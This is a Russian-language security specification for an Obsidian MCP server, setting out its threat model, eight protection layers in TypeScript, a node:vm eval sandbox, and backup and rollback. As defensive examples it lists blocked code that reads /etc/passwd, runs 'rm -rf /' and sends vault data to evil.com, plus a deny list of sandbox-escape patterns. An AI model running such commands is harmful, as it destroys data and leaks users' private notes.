v0.1b: 
# Модель безопасности: Obsidian Extended MCP

> **Версия:** 0.1b  
> **Дата:** 2026-05-28  
> **Статус:** Реализовано  
> **Связанные документы:** `AUDIT_LOGGER_SPEC.md`, `IMPLEMENTATION_GUIDE.md` §7, `src/security/SecurityEngine.ts`

---

## Содержание

1. [Обзор](#1-обзор)
2. [Модель угроз](#2-модель-угроз)
3. [8 уровней защиты](#3-8-уровней-защиты)
4. [Класс SecurityEngine](#4-класс-securityengine)
5. [Approval Matrix](#5-approval-matrix)
6. [Sandbox для CLI Eval](#6-sandbox-для-cli-eval)
7. [Rollback и восстановление](#7-rollback-и-восстановление)
8. [Интеграция с Audit Logger](#8-интеграция-с-audit-logger)

---

## 1. Обзор

Obsidian Extended MCP работает с персональными знаниями пользователя. Безопасность — не опция, а фундаментальное требование. Модель реализует **8 уровней защиты** с явной эскалацией привилегий.

### Принципы

1. **Defense in depth** — ни один уровень не является единственной точкой отказа.
2. **Least privilege** — каждая операция получает минимум необходимых прав.
3. **Fail secure** — при неопределённости запретить, а не разрешить.
4. **Audit everything** — каждая write-операция логируется.
5. **Human-in-the-loop** — разрушительные операции требуют подтверждения.

---

## 1a. Env-driven конфигурация (v2.12.6)

Все политики задаются через переменные окружения при старте сервера:

```bash
# Transport
MCP_AUTH_TOKEN=<min-32-bytes>

# Operations
READ_ONLY=false
ENABLE_COMMANDS=true
ENABLE_EVAL=false
ENABLE_BATCH_EDIT=true
ENABLE_DELETE=true

# Folders
SAFE_ZONES=raw/,sessions/
WRITE_PATHS=*
FORBIDDEN_PATHS=.git/,.obsidian/,.trash/

# Approval
APPROVAL_MODE=auto   # auto | interactive | strict
```

При `APPROVAL_MODE=strict` операции уровня 3+ блокируются до явного подтверждения.

---

## 2. Модель угроз

| Угроза | Вектор | Уровень | Митигация |
|--------|--------|---------|-----------|
| **Несанкционированный доступ** | Сторонний MCP client подключается к серверу | Высокий | Bearer token + per-vault isolation |
| **Повреждение vault** | LLM ошибочно удаляет или перезаписывает заметки | Высокий | Approval levels + backup + rollback |
| **Data exfiltration** | Запрос vault через MCP | Средний | Folder ACL + READ_ONLY mode |
| **Arbitrary code execution** | `cli_eval` с вредоносным JavaScript | Критичный | Sandbox + whitelist + forbidden patterns |
| **Plugin compromise** | Установка вредоносного плагина | Средний | Human-in-the-loop + plugin whitelist |
| **Batch destruction** | Batch edit удаляет сотни заметок | Высокий | Preview → Apply двухфазная модель |

---

## 3. 8 уровней защиты

### Уровень 1: Transport Security

**Что защищаем:** Перехват трафика между MCP client и server.

**Механизм:**
- stdio transport (default): токен проверяется через `_meta.authToken` в каждом JSON-RPC запросе (кроме `initialize`)
- Streamable HTTP: **обязательный TLS** (localhost self-signed допустим)
- **Bearer token** для HTTP: `MCP_AUTH_TOKEN` env var, min 32 bytes
- Реализация: `AuthTransportWrapper` перехватывает сообщения на уровне `StdioServerTransport`

```typescript
// src/security/SecurityEngine.ts
verifyToken(provided?: string): { valid: boolean; reason?: string } {
  const expected = this.policy.transport?.token;
  if (!expected) return { valid: true }; // Token not configured = dev mode
  if (!provided || provided.length < 32) {
    return { valid: false, reason: 'Token missing or too short' };
  }
  try {
    const a = Buffer.from(provided);
    const b = Buffer.from(expected);
    if (a.length !== b.length) {
      return { valid: false, reason: 'Token length mismatch' };
    }
    if (timingSafeEqual(a, b)) {
      return { valid: true };
    }
    return { valid: false, reason: 'Invalid token' };
  } catch {
    return { valid: false, reason: 'Token verification failed' };
  }
}
```

### Уровень 2: Vault Isolation

**Что защищаем:** Доступ к vault другого пользователя при multi-vault setup.

**Механизм:**
- Каждый vault имеет **собственный Bearer token**
- Vault path валидируется: должен быть под `MCP_VAULT_ROOT` или явно разрешён
- Запрет доступа за пределы vault (`..` traversal blocked)

```typescript
// Vault path validation
function validateVaultPath(requestedPath: string, allowedRoot: string): boolean {
  const resolved = path.resolve(requestedPath);
  const root = path.resolve(allowedRoot);
  return resolved.startsWith(root);
}
```

### Уровень 3: Folder ACL (READ_PATHS / WRITE_PATHS)

**Что защищаем:** Запись в чувствительные папки (например, `meta/` с ontology).

**Механизм:**
- `READ_PATHS`: список префиксов, доступных для чтения (default: все)
- `WRITE_PATHS`: список префиксов, доступных для записи (default: все)
- `SAFE_ZONES`: папки, куда запись разрешена без подтверждения (`raw/`, `sessions/`)

```typescript
// src/security/FolderACL.ts
interface FolderPolicy {
  readPaths: string[];      // ['*'] = all
  writePaths: string[];     // ['raw/', 'sessions/', 'concepts/']
  safeZones: string[];      // ['raw/', 'sessions/']
  forbiddenPaths: string[]; // ['.git/', '.obsidian/']
}

class FolderACL {
  isReadAllowed(filePath: string, policy: FolderPolicy): boolean {
    if (policy.readPaths.includes('*')) return true;
    return policy.readPaths.some(p => filePath.startsWith(p));
  }

  isWriteAllowed(filePath: string, policy: FolderPolicy): boolean {
    if (policy.forbiddenPaths.some(p => filePath.startsWith(p))) return false;
    if (policy.writePaths.includes('*')) return true;
    return policy.writePaths.some(p => filePath.startsWith(p));
  }

  isSafeZone(filePath: string, policy: FolderPolicy): boolean {
    return policy.safeZones.some(p => filePath.startsWith(p));
  }
}
```

### Уровень 4: Operation Gating (READ_ONLY / ENABLE_COMMANDS)

**Что защищаем:** Нежелательные операции через конфигурацию.

**Механизм:**
- `READ_ONLY=true`: блокирует все write-операции (write_note, delete_note, cli_eval)
- `ENABLE_COMMANDS=false`: блокирует `cli_command`, `cli_plugin`
- `ENABLE_EVAL=false`: блокирует `cli_eval` (вредоносный JS)
- Регистрация operation-level флагов в Dispatcher

```typescript
// src/security/OperationGate.ts
interface OperationPolicy {
  readOnly: boolean;
  enableCommands: boolean;
  enableEval: boolean;
  enableBatchEdit: boolean;
  enableDelete: boolean;
}

class OperationGate {
  check(toolName: string, policy: OperationPolicy): boolean {
    const writeTools = [
      'write_note', 'append_note', 'patch_note', 'delete_note', 'move_note',
      'write_file', 'manage_tags', 'rollback',
      'ai_ingest', 'ai_compile', 'ai_link', 'ai_tag', 'ai_enrich',
      'pool_add_vault', 'pool_remove_vault',
    ];
    const commandTools = ['cli_command', 'cli_plugin'];
    const evalTools = ['cli_eval'];
    const deleteTools = ['delete_note'];
    const batchTools = ['batch_edit'];

    if (policy.readOnly && writeTools.includes(toolName)) return false;
    if (!policy.enableCommands && commandTools.includes(toolName)) return false;
    if (!policy.enableEval && evalTools.includes(toolName)) return false;
    if (!policy.enableDelete && deleteTools.includes(toolName)) return false;
    if (!policy.enableBatchEdit && batchTools.includes(toolName)) return false;

    return true;
  }
}
```

### Уровень 5: Destructive Operations — Human-in-the-Loop

**Что защищаем:** Случайное или вредоносное удаление/перемещение заметок.

**Механизм:**
- **Level 1** (Read): Без подтверждения
- **Level 2** (Safe zone write): Без подтверждения (`raw/`, `sessions/`)
- **Level 3** (Concept/index write): Требует подтверждения
- **Level 4** (Delete, move, batch edit): Требует подтверждения + backup
- **Level 5** (Eval arbitrary JS): Требует явного opt-in + sandbox
- **Level 6** (Plugin install/uninstall): Требует явного opt-in
- **Level 7** (Batch destructive): Preview → Apply с rollback
- **Level 8** (Audit): Всё логируется независимо

```typescript
// src/security/ApprovalEngine.ts
class ApprovalEngine {
  getApprovalLevel(toolName: string, args: any): number {
    if (this.isReadOnly(toolName)) return 1;
    if (this.isSafeZoneWrite(toolName, args)) return 2;
    if (['write_note', 'append_note', 'patch_note'].includes(toolName)) return 3;
    if (['delete_note', 'move_note'].includes(toolName)) return 4;
    if (toolName === 'cli_eval') return 5;
    if (toolName === 'cli_plugin') return 6;
    if (toolName === 'batch_edit') return 7;
    return 1;
  }

  private isReadOnly(toolName: string): boolean {
    return ['read_note', 'search_notes', 'cli_backlinks', 'fs_get_graph',
            'fs_graph_find_path', 'graph_analyze_centrality',
            'graph_detect_communities', 'list_all_tags', 'cli_orphans',
            'cli_unresolved', 'cli_search', 'semantic_search'].includes(toolName);
  }

  private isSafeZoneWrite(toolName: string, args: any): boolean {
    const path = args?.path || args?.raw_path || '';
    return ['write_note', 'append_note', 'patch_note'].includes(toolName) &&
           (path.startsWith('raw/') || path.startsWith('sessions/'));
  }
}
```

### Уровень 6: Batch Edits — Preview → Apply

**Что защищаем:** Непреднамеренное повреждение сотен заметок.

**Механизм:**
- Batch edit всегда двухфазный:
  1. **Preview** — возвращает список изменений без применения
  2. **Apply** — применяет только после явного подтверждения
- Автоматический backup всех затронутых файлов в `.mcp-cache/backups/{timestamp}/`
- Rollback: восстановление из backup одной командой

```typescript
// src/security/BatchEditGuard.ts
interface BatchPreview {
  affectedFiles: string[];
  changes: Array<{ file: string; before: string; after: string }>;
  backupPath: string;
}

class BatchEditGuard {
  async preview(filter: ListFilter, operation: string, target: string, replacement?: string): Promise<BatchPreview> {
    const files = await this.resolveFiles(filter);
    const changes = [];
    for (const file of files) {
      const before = await fs.readFile(file, 'utf8');
      const after = this.applyOperation(before, operation, target, replacement);
      if (before !== after) changes.push({ file, before, after });
    }
    const backupPath = `.mcp-cache/backups/${Date.now()}`;
    return { affectedFiles: files, changes, backupPath };
  }

  async apply(preview: BatchPreview): Promise<number> {
    // Backup first
    for (const change of preview.changes) {
      await this.backup(change.file, preview.backupPath);
    }
    // Apply changes
    for (const change of preview.changes) {
      await fs.writeFile(change.file, change.after);
    }
    return preview.changes.length;
  }

  async rollback(backupPath: string): Promise<void> {
    // Restore from backup
  }
}
```

### Уровень 7: Plugin Bridge Sandboxing

**Что защищаем:** Выполнение вредоносного кода через CLI eval или user scripts.

**Механизм:**
- **Whitelist глобальных объектов:** только `app`, `DataviewAPI`, `moment`, `MetadataCache`
- **Forbidden patterns:** `require(`, `fs.`, `child_process`, `fetch(`, `XMLHttpRequest`, `eval(`, `Function(`
- **Timeout:** max 5s для eval, 30s для batch eval
- **No network:** eval не имеет доступа к сети

```typescript
// src/security/Sandbox.ts
const FORBIDDEN_PATTERNS = [
  /\brequire\s*\(/, /\beval\s*\(/, /\bFunction\s*\(/, /\.\s*constructor\b/,
  /\bimport\s*\(/, /\bchild_process\b/, /\bfs\b/, /\bprocess\b/,
  /\bfetch\s*\(/, /\bXMLHttpRequest\b/, /\bWebSocket\b/,
  /\(0\s*,\s*eval\)/, /globalThis\s*\[\s*['"`]require['"`]\s*\]/,
  /globalThis\s*\.\s*require/,
  /\[\s*['"`]constructor['"`]\s*\]/, /\\u0{3,6}[0-9a-fA-F]{2}/,
  /\bReflect\s*\.\s*construct\b/, /\bReflect\s*\.\s*apply\b/,
  /\b__proto__\b/, /\bProxy\b/, /\bwith\s*\(/,
  /\bObject\.setPrototypeOf\b/, /\barguments\.callee\b/,
  /\beval\.call\b/, /\beval\.apply\b/,
  /\bFunction\.call\b/, /\bFunction\.apply\b/,
];

class Sandbox {
  validate(code: string): { allowed: boolean; reason?: string } {
    for (const pattern of FORBIDDEN_PATTERNS) {
      if (pattern.test(code)) {
        return { allowed: false, reason: `Forbidden pattern: ${pattern.source}` };
      }
    }
    return { allowed: true };
  }

  async execute<T = unknown>(code: string, context?: Record<string, unknown>): Promise<T> {
    const validation = this.validate(code);
    if (!validation.allowed) {
      throw new Error(`Sandbox validation failed: ${validation.reason}`);
    }
    // Build minimal context with only allowed globals + user context
    const sandboxGlobals: Record<string, unknown> = {};
    for (const key of ['app', 'DataviewAPI', 'moment', 'MetadataCache']) {
      if (key in globalThis) sandboxGlobals[key] = (globalThis as Record<string, unknown>)[key];
    }
    if (context) Object.assign(sandboxGlobals, context);

    const vmContext = createContext(sandboxGlobals, { codeGeneration: { strings: false, wasm: false } });
    const wrapped = `(async () => { ${code} })()`;
    return new Promise<T>((resolve, reject) => {
      const timer = setTimeout(() => reject(new Error('Timed out')), 5000);
      try {
        const script = new Script(wrapped, { produceCachedData: false });
        const result = script.runInContext(vmContext, { timeout: 5000, displayErrors: true });
        Promise.resolve(result)
          .then((value) => { clearTimeout(timer); resolve(value as T); })
          .catch((err) => { clearTimeout(timer); reject(err); });
      } catch (err) {
        clearTimeout(timer);
        reject(err);
      }
    });
  }
}
```

### Уровень 8: Audit Logging

**Что защищаем:** Невозможность расследовать инциденты.

**Механизм:**
- Каждая write-операция логируется: timestamp, tool, args, user, before/after hash
- Логи в JSON Lines (`audit.log`)
- Ротация: 90 дней или 10K записей
- Per-session логи: `sessions/mcp-audit-{sessionId}.jsonl`

См. полную спецификацию в `AUDIT_LOGGER_SPEC.md`.

---

## 4. Класс SecurityEngine

```typescript
// src/security/SecurityEngine.ts

interface SecurityPolicy {
  transport: { requireTls: boolean; token?: string };
  vault: { allowedRoots: string[] };
  folders: FolderPolicy;
  operations: OperationPolicy;
  approval: { mode: 'auto' | 'interactive' | 'strict' };
}

class SecurityEngine {
  constructor(
    private policy: SecurityPolicy,
    private folderACL: FolderACL,
    private operationGate: OperationGate,
    private approvalEngine: ApprovalEngine,
    private batchGuard: BatchEditGuard,
    private evalSandbox: EvalSandbox,
    private auditLogger: AuditLogger
  ) {}

  async authorize(toolName: string, args: Record<string, any>): Promise<{ allowed: boolean; level: number; reason?: string }> {
    // 1. Operation gating
    if (!this.operationGate.check(toolName, this.policy.operations)) {
      return { allowed: false, level: 0, reason: 'Operation disabled by policy' };
    }

    // 2. Folder ACL
    const filePath = args?.path || args?.from || args?.raw_path || '';
    if (filePath) {
      if (!this.folderACL.isReadAllowed(filePath, this.policy.folders) && this.isReadOp(toolName)) {
        return { allowed: false, level: 0, reason: 'Read not allowed for this path' };
      }
      if (!this.folderACL.isWriteAllowed(filePath, this.policy.folders) && this.isWriteOp(toolName)) {
        return { allowed: false, level: 0, reason: 'Write not allowed for this path' };
      }
    }

    // 3. Approval level
    const level = this.approvalEngine.getApprovalLevel(toolName, args);

    // 4. Audit log
    await this.auditLogger.log({
      event: 'tool_call',
      tool: toolName,
      args,
      level,
      timestamp: new Date().toISOString()
    });

    return { allowed: true, level };
  }

  private isReadOp(toolName: string): boolean {
    return toolName.startsWith('fs_get_') || toolName.startsWith('fs_read_') || toolName.startsWith('cli_');
  }

  private isWriteOp(toolName: string): boolean {
    return toolName.startsWith('fs_write_') || toolName.startsWith('fs_append_') ||
           toolName.startsWith('fs_patch_') || toolName.startsWith('fs_delete_') ||
           toolName.startsWith('fs_move_') || toolName.startsWith('fs_batch_');
  }
}
```

---

## 5. Approval Matrix

| Операция | READ_ONLY | ENABLE_COMMANDS | ENABLE_EVAL | Уровень | Подтверждение |
|----------|-----------|-----------------|-------------|---------|---------------|
| `read_note` | ✅ | N/A | N/A | 1 | Нет |
| `search_notes` | ✅ | N/A | N/A | 1 | Нет |
| `write_note` (raw/) | ✅ | N/A | N/A | 2 | Нет |
| `write_note` (concepts/) | ❌ | N/A | N/A | 3 | Да |
| `delete_note` | ❌ | N/A | N/A | 4 | Да + backup |
| `move_note` | ❌ | N/A | N/A | 4 | Да + backup |
| `batch_edit` | ❌ | N/A | N/A | 7 | Preview → Apply |
| `cli_eval` | ❌ | N/A | ❌ | 5 | Opt-in + sandbox |
| `cli_command` | N/A | ❌ | N/A | 4 | Opt-in |
| `cli_plugin` | N/A | ❌ | N/A | 6 | Opt-in |

---

## 6. Sandbox для CLI Eval

### Реализация (v2.12.6)

Sandbox использует модуль `node:vm` с полной изоляцией контекста:

```typescript
import { createContext, Script } from 'node:vm';

const sandboxGlobals: Record<string, unknown> = {};
for (const key of this.allowedGlobals) {
  if (key in globalThis) sandboxGlobals[key] = (globalThis as Record<string, unknown>)[key];
}
if (context) Object.assign(sandboxGlobals, context);

const vmContext = createContext(sandboxGlobals, {
  codeGeneration: { strings: false, wasm: false },
});

const wrapped = `(async () => { ${code} })()`;
const script = new Script(wrapped, { produceCachedData: false });
return script.runInContext(vmContext, {
  timeout: this.maxTimeoutMs,
  displayErrors: true,
});
```

**Защита от escape:**
- **Regex-валидация** перед выполнением: `require`, `eval`, `Function`, `constructor`, `import`, `child_process`, `fs`, `process`, `fetch`, `XMLHttpRequest`, `WebSocket`
- **Изоляция контекста**: только whitelisted globals (`app`, `DataviewAPI`, `moment`, `MetadataCache`) + предоставленный `context`
- **Таймаут**: максимальное время выполнения по умолчанию 5000 мс

### Примеры заблокированного кода

```javascript
// ❌ Заблокировано
require('fs').readFileSync('/etc/passwd');
child_process.exec('rm -rf /');
fetch('https://evil.com/exfil', { body: vaultData });

// ✅ Разрешено
app.workspace.getActiveFile().path;
DataviewAPI.query('TABLE tags FROM #project');
app.metadataCache.getFirstLinkpathDest('note');
```

### Конфигурация

```yaml
# mcp-config.yaml
security:
  readOnly: false
  enableCommands: true
  enableEval: false
  enableBatchEdit: true
  enableDelete: true
  safeZones:
    - raw/
    - sessions/
  writePaths:
    - raw/
    - sessions/
    - concepts/
    - index/
    - projects/
  forbiddenPaths:
    - .git/
    - .obsidian/
    - .trash/
```

---

## 7. Rollback и восстановление

### Автоматический backup

Перед любой write-операцией уровня 3+ создаётся backup:

```typescript
async function backupFile(filePath: string): Promise<string> {
  const backupDir = `.mcp-cache/backups/${Date.now()}`;
  const backupPath = path.join(backupDir, filePath);
  await fs.mkdir(path.dirname(backupPath), { recursive: true });
  await fs.copyFile(filePath, backupPath);
  return backupPath;
}
```

### Rollback команда

```bash
# Восстановление из последнего backup
npx obsidian-extended-mcp rollback --path /path/to/vault --to last

# Восстановление конкретного файла
npx obsidian-extended-mcp rollback --path /path/to/vault --file concepts/note.md --to 20260527-120000
```

---

## 8. Интеграция с Audit Logger

Каждая операция уровня 2+ логируется:

```json
{
  "timestamp": "2026-05-27T12:00:00Z",
  "event": "tool_call",
  "tool": "delete_note",
  "args": { "path": "concepts/old.md", "soft": true },
  "level": 4,
  "user": "mcp-client-001",
  "sessionId": "sess-abc123",
  "vaultPath": "/path/to/vault",
  "result": "success",
  "backupPath": ".mcp-cache/backups/1685179200000/concepts/old.md"
}
```

См. полную спецификацию форматов, ротации и search API в `AUDIT_LOGGER_SPEC.md`.
